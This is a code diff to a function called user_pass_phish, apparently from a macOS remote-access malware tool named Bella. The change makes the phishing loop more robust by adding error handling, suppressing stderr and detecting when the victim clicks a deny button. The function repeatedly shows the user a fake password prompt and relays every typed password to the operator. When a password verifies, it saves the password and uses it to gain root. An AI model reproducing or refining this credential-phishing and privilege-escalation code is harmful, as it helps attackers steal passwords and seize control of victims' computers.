@@ -1731,22 +1731,29 @@ def user_pass_phish():
 		if isinstance(check, str):
 			send_msg("%sAccount password already found:\n%s\n" % (blue_star, check.replace("\n", "")), True)
 			return 1
+		FNULL = open(os.devnull, 'w') ## open /dev/null to pipe STDERR to it
 
-		out = subprocess.check_output(script, shell=True)
-		password = out.split("text returned:")[-1].replace("\n", "").split(", gave up")[0]
-		send_msg("%sUser has attempted to use password: [%s]\n" % (blue_star, password), False)
-		if password == "":
-			continue
-		if verifyPassword(userTB, password):
-			send_msg("%sVerified! Account password is: [%s]%s\n" % (greenPlus, password, endANSI), False)
-			subprocess_cleanup()
-			updateDB(encrypt("%s:%s" % (userTB, password)), 'localPass') #store encrypted pass in DB
-			#os.system("networksetup -setairportpower en0 on") #enable Wi-Fi
-			send_msg("%sUsing this password to root Bella.\n" % yellow_star, False)
-			rooter()
-			return 1
-		else:
-			send_msg("%sUser input: [%s] failed. Trying again.\n" % (red_minus, password), False)
+		try:
+			out = subprocess.check_output(script, stderr=FNULL ,shell=True)
+			button = out.split("button returned:")[-1].startswith("\"Deny")
+			password = out.split("text returned:")[-1].replace("\n", "").split(", gave up")[0]
+			send_msg("%sUser has attempted to use password: [%s]\n" % (blue_star, password), False)
+			if password == "":
+				continue
+			if verifyPassword(userTB, password):
+				send_msg("%sVerified! Account password is: [%s]%s\n" % (greenPlus, password, endANSI), False)
+				subprocess_cleanup()
+				updateDB(encrypt("%s:%s" % (userTB, password)), 'localPass') #store encrypted pass in DB
+				#os.system("networksetup -setairportpower en0 on") #enable Wi-Fi
+				send_msg("%sUsing this password to root Bella.\n" % yellow_star, False)
+				rooter()
+				return 1
+			else:
+				send_msg("%sUser input: [%s] failed. Trying again.\n" % (red_minus, password), False)
+		except subprocess.CalledProcessError as e:
+			if (e.returncode):
+				send_msg("%sUser canceled. Trying again.\n" % (red_minus), False)
+
 	return 1 #this should never get here, while loop should continue indefinitely.
 
 def verifyPassword(username, password):
